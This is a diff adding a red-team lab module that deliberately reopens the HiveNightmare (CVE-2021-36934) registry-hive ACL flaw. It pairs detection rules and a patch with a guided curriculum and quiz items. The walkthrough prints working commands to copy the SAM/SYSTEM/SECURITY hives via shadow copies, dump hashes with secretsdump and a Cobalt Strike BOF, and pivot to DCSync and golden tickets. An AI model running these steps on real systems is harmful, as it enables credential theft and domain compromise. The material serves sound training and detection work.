@@ -1,0 +1,448 @@
+# Bolt-on: HiveNightmare / SeriousSAM (CVE-2021-36934)
+# ----------------------------------------------------
+# Windows SAM + SYSTEM + SECURITY registry hives readable by any local
+# non-admin user. Result: extract SYSTEM-context password hashes (Domain
+# Admin cached creds, machine account hash, local admin hashes).
+#
+# Install reverts the explicit READ ACE on the hives. Patch re-locks them
+# AND deletes any shadow copy that may also hold a readable snapshot.
+
+id: bolton.known-cve.hivenightmare
+slug: hivenightmare
+name: "HiveNightmare / SeriousSAM (CVE-2021-36934)"
+version: "1.0.0"
+author: "Red Team Infra"
+last_updated: 2026-05-22
+
+category: known-cve
+subcategory: privilege-escalation
+tags:
+  - cve-2021-36934
+  - hivenightmare
+  - seriousSAM
+  - registry-acl
+  - local-privilege-escalation
+description: >
+  Windows SAM, SYSTEM, and SECURITY hives in C:\Windows\System32\config
+  have a READ ACE for the BUILTIN\Users group on 20H1+ Windows builds.
+  Any local user can read the hives via volume shadow copies, extracting
+  SYSTEM-context password hashes (LSA secrets, domain cached creds,
+  machine account hash, local Administrator NTLM). Lab install
+  re-applies the vulnerable ACL so the lab is exploitable. Patch
+  restores SYSTEM:Full / Administrators:Full + Authenticated Users:READ
+  on parent dir only and clears any extant shadow copy.
+
+cve:
+  - CVE-2021-36934
+references:
+  - "https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-36934"
+  - "https://github.com/GossiTheDog/HiveNightmare"
+  - "https://attack.mitre.org/techniques/T1003/002/"
+
+mitre:
+  tactic:
+    id: TA0006
+    name: "Credential Access"
+  technique:
+    id: T1003
+    name: "OS Credential Dumping"
+  subtechnique:
+    id: T1003.002
+    name: "Security Account Manager"
+
+detection:
+  coverage_status: partial
+  elastic_rules:
+    - rule_uuid: "11013227-0301-4a8c-b15c-d99fb01ac3aa"
+      rule_name: "Suspicious Access to SAM Registry Hive"
+      coverage: full
+      confidence: high
+      last_validated: 2026-05-22
+      notes: "Catches direct hive access via Volume Shadow Copy."
+    - rule_uuid: "01f1d505-44d5-4dde-b2c8-0a8e7b2e7e51"
+      rule_name: "Volume Shadow Copy Created via VssAdmin"
+      coverage: indirect
+      confidence: medium
+      last_validated: 2026-05-22
+      notes: "Side-channel — vssadmin invocation is the typical attack precondition."
+  signal_sources:
+    - "Windows Event 4663 — file access (SACL on %SystemRoot%\\System32\\config\\SAM)"
+    - "Sysmon Event 11 — file create (under \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy*)"
+    - "Process Create — vssadmin / wbadmin / esentutl"
+
+targets:
+  supported_os:
+    - family: windows
+      min_version: "10"
+      max_version: "2022"
+      edition_in: ["Datacenter", "Standard", "Pro", "Enterprise"]
+  required_roles:
+    - workstation
+    - member_server
+    - domain_controller
+  required_services: []
+depends_on: []
+conflicts_with: []
+
+side_effects:
+  global: false
+  network_visible: false
+  reboot_required: false
+
+install:
+  estimated_time_seconds: 15
+  steps:
+    - ansible_role: bolton_hivenightmare
+      description: "Grant BUILTIN\\Users READ on SAM/SYSTEM/SECURITY hives."
+      role_vars:
+        bolton_hivenight_principal: "BUILTIN\\Users"
+        bolton_hivenight_rights: "Read"
+  verify:
+    probe: |
+      icacls "%SystemRoot%\System32\config\SAM" | findstr /i "BUILTIN\\Users:(R)"
+    timeout_seconds: 30
+    expect_exit_code: 0
+
+uninstall:
+  description: "Restore default ACL (SYSTEM:F, Administrators:F)."
+  estimated_time_seconds: 15
+  steps:
+    - ansible_role: bolton_hivenightmare_revert
+      description: "Restore SYSTEM:F / Administrators:F on the three hives."
+      role_vars: {}
+  verify:
+    probe: |
+      icacls "%SystemRoot%\System32\config\SAM" | findstr /i "BUILTIN\\Users" && exit /b 1
+      exit /b 0
+    timeout_seconds: 20
+    expect_exit_code: 0
+
+patch:
+  description: >
+    Apply the official Microsoft remediation: reset the ACL on
+    %SystemRoot%\System32\config\* to default (SYSTEM:F, Administrators:F)
+    AND delete any volume shadow copy that may carry the readable snapshot.
+  patch_reference:
+    - "https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-36934"
+  complexity: low
+  side_effects:
+    - "ACL restored to default — SYSTEM and Administrators only."
+    - "All volume shadow copies deleted (operator data on shadow copies is lost)."
+  rollback_supported: true
+  steps:
+    - script: "scripts/bolton/win/reset_hive_acl.ps1"
+      engine: powershell
+      description: "icacls reset on SAM / SYSTEM / SECURITY."
+      args: {}
+    - script: "scripts/bolton/win/clear_shadow_copies.ps1"
+      engine: powershell
+      description: "vssadmin delete shadows /all /quiet"
+      args: {}
+  verify:
+    probe: |
+      icacls "%SystemRoot%\System32\config\SAM" | findstr /i "BUILTIN\\Users" && exit /b 1
+      vssadmin list shadows | findstr /c:"No items found" >nul && exit /b 0 || exit /b 1
+    timeout_seconds: 60
+    expect_exit_code: 0
+  exploit_probe_after_patch: "webapp/bolton/exploit_probes/hivenightmare_read_sam.ps1"
+
+patch_revert:
+  description: "Re-apply the vulnerable ACL so the lab is exploitable again."
+  estimated_time_seconds: 15
+  steps:
+    - ansible_role: bolton_hivenightmare
+      description: "Re-grant BUILTIN\\Users READ on the hives."
+      role_vars:
+        bolton_hivenight_principal: "BUILTIN\\Users"
+        bolton_hivenight_rights: "Read"
+  verify:
+    probe: |
+      icacls "%SystemRoot%\System32\config\SAM" | findstr /i "BUILTIN\\Users:(R)"
+    timeout_seconds: 30
+    expect_exit_code: 0
+  warning: "Hives readable again. Hashes recoverable via VSS in <30s."
+
+cost:
+  storage_mb: 0
+  cpu_pct: 0
+  detectability: medium
+
+curriculum:
+  title: "HiveNightmare / SeriousSAM — Reading SAM as a low-priv user"
+  summary: >
+    Guided walkthrough of CVE-2021-36934 against tlws01 (Windows 11 Pro). You
+    will confirm the BUILTIN\Users READ ACE on the SAM/SYSTEM/SECURITY hives,
+    create a volume shadow copy as a low-priv user, lift SYSTEM-context
+    hashes (machine account, local Administrator, cached domain creds),
+    and walk the Elastic detections that catch each phase.
+  learning_objectives:
+    - "Explain why the SAM/SYSTEM/SECURITY hives must never be readable by BUILTIN\\Users."
+    - "Use icacls to enumerate vulnerable ACLs on a Windows 10/11 host."
+    - "Extract hashes via three independent toolchains: GossiTheDog HiveNightmare, Impacket secretsdump LOCAL, and a CS BOF."
+    - "Map each exploitation step to the firing Elastic rule on tllinux01's stack."
+  prerequisites:
+    - "Beacon on tlws01 running as TESTLAB\\jdoe (low-priv domain user)"
+    - "Kali attack box at 192.168.1.100 with Impacket >= 0.12 installed"
+    - "Elastic stack reachable on tllinux01:9200 (Kibana on :5601)"
+  estimated_total_minutes: 35
+  steps:
+    - id: "01-confirm-acl"
+      title: "Confirm the vulnerable ACL on the SAM hive"
+      estimated_minutes: 5
+      markdown: |
+        ## Step 1 — Verify BUILTIN\Users has READ on the hives
+
+        The bug is a deliberately-misset DACL on three registry hive files
+        in `C:\Windows\System32\config\`. On a patched host only SYSTEM and
+        Administrators can read them; on a vulnerable host BUILTIN\Users
+        has `(R)`.
+
+        From the tlws01 beacon (running as `TESTLAB\jdoe`):
+
+        ```powershell
+        icacls C:\Windows\System32\config\SAM
+        icacls C:\Windows\System32\config\SYSTEM
+        icacls C:\Windows\System32\config\SECURITY
+        ```
+
+        Expected output on a vulnerable host:
+
+        ```
+        C:\Windows\System32\config\SAM BUILTIN\Users:(I)(RX)
+                                       NT AUTHORITY\SYSTEM:(I)(F)
+                                       BUILTIN\Administrators:(I)(F)
+        ```
+
+        The presence of `BUILTIN\Users:(I)(RX)` (or `(R)`) is the gate.
+        Even with READ on the file you cannot open the live hive — it's
+        held by the kernel — so you need a shadow copy snapshot to actually
+        pull bytes.
+
+        > **Detection callout** — *Suspicious File Access to SAM Registry
+        > Hive* (Elastic rule `11013227-0301-4a8c-b15c-d99fb01ac3aa`) fires
+        > on the next step's hive read, not this enumeration. Pure `icacls`
+        > on the file is below detection threshold.
+      assessment:
+        question: "Why does running `icacls` against the SAM file not trigger the SAM-read detection rule?"
+        options:
+          - "icacls runs in user-mode and is implicitly whitelisted by Defender."
+          - "icacls only queries the DACL metadata via NtQuerySecurityObject — it never opens the file for read data, so no FileRead event fires."
+          - "The SAM file isn't actually protected; only the registry key is."
+          - "icacls runs as SYSTEM, so its access is filtered out by the detection."
+        correct_index: 1
+        explanation: >
+          The detection keys on a file-open event (Sysmon EID 11 / 4663 with
+          ReadData access mask) against `\System32\config\SAM`. icacls only
+          asks for the DACL via NtQuerySecurityObject — no data read, no
+          alert. The exploit step in #2 opens the shadow-copy file with
+          GENERIC_READ which is exactly what the rule keys on.
+    - id: "02-shadow-copy"
+      title: "Create a volume shadow copy and copy out the hives"
+      estimated_minutes: 7
+      markdown: |
+        ## Step 2 — VSS snapshot + raw hive copy
+
+        The live `C:\Windows\System32\config\SAM` is open by the kernel; you
+        cannot read it directly. The classic workaround is to create a
+        volume shadow copy of `C:\` — the snapshot exposes the hive as a
+        regular file under `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyN\`.
+
+        From an elevated context on tlws01 (or via diskshadow which doesn't
+        require admin on default Win11 builds — that's the *actual* bug
+        path; we'll use both):
+
+        ```powershell
+        # Path A — admin-shell (for baseline understanding)
+        vssadmin create shadow /for=C:
+        # Note the "Shadow Copy Volume Name" — e.g. \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+        copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM" C:\Users\jdoe\sam.save
+        copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM" C:\Users\jdoe\system.save
+        copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY" C:\Users\jdoe\security.save
+        ```
+
+        ```powershell
+        # Path B — low-priv exploitation (the actual CVE-2021-36934 vector)
+        # If a shadow copy ALREADY EXISTS (Windows creates them automatically
+        # for restore points, Windows Update, etc.) jdoe can read straight
+        # out of it without needing vssadmin:
+        Get-CimInstance -ClassName Win32_ShadowCopy
+        # Pick a DeviceObject and copy the hives — no admin needed because
+        # BUILTIN\Users has READ on the underlying file ACL.
+        copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM" $env:TEMP\sam
+        ```
+
+        Success criteria: three ~30-60KB files (`SAM`, `SYSTEM`, `SECURITY`)
+        in your user-writable directory.
+
+        > **Detection callout** — *Volume Shadow Copy Created via VssAdmin*
+        > (Elastic rule `01f1d505-44d5-4dde-b2c8-0a8e7b2e7e51`) catches Path A.
+        > Path B is the silent variant — no vssadmin process, just file reads
+        > under `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy*`, which is
+        > what Sysmon Event 11 with a path-matching rule needs to catch.
+    - id: "03-extract-hashes"
+      title: "Extract hashes — three independent toolchains"
+      estimated_minutes: 10
+      markdown: |
+        ## Step 3 — Crack the hives
+
+        Once you have `sam.save` / `system.save` / `security.save` off the
+        target, hash extraction is offline. Three options, pick whichever
+        matches the operator's OPSEC posture.
+
+        ### Option A — GossiTheDog standalone EXE (loud, easiest)
+
+        On tlws01, drop `HiveNightmare.exe` from
+        https://github.com/GossiTheDog/HiveNightmare and run:
+
+        ```powershell
+        .\HiveNightmare.exe
+        # Output: writes SAM-2021-..., SYSTEM-2021-..., SECURITY-2021-... files
+        # to the current directory, pre-parsed.
+        ```
+
+        ### Option B — Impacket `secretsdump.py LOCAL` (preferred, offline on Kali)
+
+        Exfil the three hives to `192.168.1.100` first (HTTP/SMB/etc),
+        then on Kali:
+
+        ```bash
+        impacket-secretsdump -sam ./sam.save -system ./system.save -security ./security.save LOCAL
+        ```
+
+        Expected output:
+
+        ```
+        [*] Target system bootKey: 0x...
+        [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+        Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+        localuser:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+        [*] Dumping cached domain logon information (domain/username:hash)
+        TESTLAB.LOCAL/jdoe:$DCC2$10240#jdoe#...
+        TESTLAB.LOCAL/ansible:$DCC2$10240#ansible#...
+        [*] Dumping LSA Secrets
+        $MACHINE.ACC: aad3b435...:e8a7c...   <-- machine account NTLM, this is the prize
+        ```
+
+        ### Option C — Cobalt Strike BOF (in-memory, quiet)
+
+        If you don't want to drop EXEs, the `nightmare` BOF
+        (https://github.com/EspressoCake/HiveNightmare_BOF) reads + parses
+        in one beacon command:
+
+        ```
+        beacon> inline-execute /opt/bofs/hivenightmare.x64.o
+        [+] Found shadow copy: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+        [+] SAM bootkey: 0x...
+        [+] Administrator:500:...:31d6cfe0d16ae931b73c59d7e0c089c0:::
+        ```
+
+        The machine account NTLM (`$MACHINE.ACC`) is gold — pass it to
+        `secretsdump.py -hashes <hash> testlab.local/tlws01\$@tldc01` to
+        DCSync if the account has the right privileges, or use it for
+        silver-ticket forging against tlws01.
+
+        > **Detection callout** — *Suspicious Access to SAM Registry Hive*
+        > fires on any of A/B/C because all three open the hive file at the
+        > shadow-copy path with GENERIC_READ. Option C (BOF) avoids process
+        > creation but does not avoid the file-open event.
+      assessment:
+        question: "After dumping LSA secrets, which artefact gives you the most lateral movement potential?"
+        options:
+          - "Local Administrator NTLM — usable on every host with the same image."
+          - "The machine account hash ($MACHINE.ACC) — enables silver tickets against any service on tlws01 and may unlock DCSync if the account is over-privileged."
+          - "DCC2 cached creds for TESTLAB\\jdoe — already a low-priv user."
+          - "The bootkey — only used to decrypt the hives themselves."
+        correct_index: 1
+        explanation: >
+          Local Admin is useful but typically only valuable if reused. DCC2
+          creds need cracking (slow). The bootkey is required for decryption
+          but worthless on its own. The machine account hash gives Kerberos
+          silver-tickets impersonating any user against any service on
+          tlws01, and in misconfigured envs (e.g. machine account in a
+          Domain Admins-equivalent group) yields direct DCSync.
+    - id: "04-pivot-to-domain"
+      title: "Pivot from local hashes to domain compromise"
+      estimated_minutes: 6
+      markdown: |
+        ## Step 4 — Turn hive output into domain access
+
+        With the machine account hash for tlws01\$, request a Kerberos TGT
+        from Kali:
+
+        ```bash
+        impacket-getTGT testlab.local/tlws01\$ -hashes :e8a7c...
+        export KRB5CCNAME=tlws01\$.ccache
+        klist
+        ```
+
+        If `tlws01$` has any DCSync rights (commonly: misconfigured ACL on
+        the domain root, machine in Account Operators, etc.):
+
+        ```bash
+        impacket-secretsdump -k -no-pass testlab.local/tlws01\$@tldc01.testlab.local
+        # Pulls every NTDS.dit hash including krbtgt
+        ```
+
+        With krbtgt: forge a Golden Ticket and you own testlab.local
+        forever.
+
+        > **Detection callout** — *Potential DCSync Activity* fires on the
+        > DRSGetNCChanges replication request. This is the single highest-
+        > signal event in the chain.
+    - id: "05-blue-team-detection-and-patch"
+      title: "Blue-team detection + apply patch"
+      estimated_minutes: 7
+      markdown: |
+        ## Step 5 — Detect, then patch
+
+        On Kibana (https://10.99.50.13:5601) load the **Detections** tab
+        and filter `host.name : tlws01`. Within 30s of running Step 2/3
+        you should see:
+
+        | Rule | Source event | What to look for |
+        |---|---|---|
+        | Suspicious Access to SAM Registry Hive | Sysmon EID 11 | `file.path` matches `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy*\Windows\System32\config\SAM` |
+        | Volume Shadow Copy Created via VssAdmin | Sysmon EID 1 | `process.name = vssadmin.exe`, `process.command_line` contains `create shadow` |
+        | Potential DCSync Activity | 4662 on DC | `event.action : Directory-Service-Access` + GUID `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` |
+
+        **Mitigation — apply the patch via the bolt-on UI.** Patch action
+        runs `icacls C:\Windows\System32\config\* /reset` to restore the
+        default ACL (SYSTEM:F / Administrators:F only), then runs
+        `vssadmin delete shadows /all /quiet` to nuke any extant snapshot
+        that still carries the readable copy.
+
+        Verify post-patch:
+
+        ```powershell
+        icacls C:\Windows\System32\config\SAM
+        # Expected — no BUILTIN\Users line.
+        vssadmin list shadows
+        # Expected — "No items found that satisfy the query."
+        ```
+
+        Re-run Step 2 — the copy from the shadow path now fails with
+        `Access is denied` because (a) no shadow copy exists, and (b) even
+        if you create one, BUILTIN\Users is no longer on the SAM ACL.
+
+        > **Operational note** — patching does NOT install a KB. The KB for
+        > CVE-2021-36934 only sets the new default ACL on *fresh* installs
+        > and *fresh* shadow copies; existing shadow copies created before
+        > the KB still carry the bad ACL. The bolt-on's patch explicitly
+        > deletes shadows, which Microsoft's official guidance also requires.
+      assessment:
+        question: "Why does the official Microsoft patch require deleting all volume shadow copies, not just resetting the live ACL?"
+        options:
+          - "The KB resets the live hive ACL but cannot retroactively rewrite the ACL on existing shadow-copy snapshots — the snapshot still carries the vulnerable ACE, and exploitation reads from the snapshot, not the live file."
+          - "Shadow copies consume disk space and need to be cleaned for performance."
+          - "Without deleting shadows, the patch's ACL change is reverted on next boot."
+          - "Shadow copies bypass NTFS permissions entirely."
+        correct_index: 0
+        explanation: >
+          The exploit reads the hive through a shadow copy at
+          \\?\GLOBALROOT\... — that snapshot was taken with the OLD ACL,
+          so the vulnerable READ ACE for BUILTIN\Users persists in the
+          snapshot regardless of what you do to the live file. Microsoft's
+          guidance is explicit: "you must delete any System Restore points
+          and Shadow volumes that existed prior to restricting access."
+
+status: stable
